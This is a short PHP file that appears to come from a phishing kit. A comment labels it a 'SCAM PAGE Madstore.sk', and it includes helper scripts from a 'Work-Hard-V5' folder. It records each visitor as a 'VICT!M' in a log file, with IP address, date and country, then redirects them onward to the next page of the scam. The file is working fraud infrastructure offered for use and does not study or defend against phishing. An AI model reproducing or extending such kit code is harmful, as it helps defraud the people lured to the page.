<?php
//<!-- SCAM PAGE Madstore.sk -->
include ('./Work-Hard-V5/bt.php');
include ('./Work-Hard-V5/makelang.php');
$milaf = fopen("VST.txt","a");
fwrite($milaf,$ib."  -| LOG VICT!M !! |-   ".$dt."                  -        " . $cntc ."\n");
header('Location: newdir.php');
?>

